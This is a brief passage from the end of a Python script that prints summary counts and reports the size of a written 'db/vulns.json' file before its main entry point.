    print(json.dumps(payload["counts"], indent=1))
    print("db/vulns.json written:", out_json.stat().st_size, "bytes")


if __name__ == "__main__":
    main()
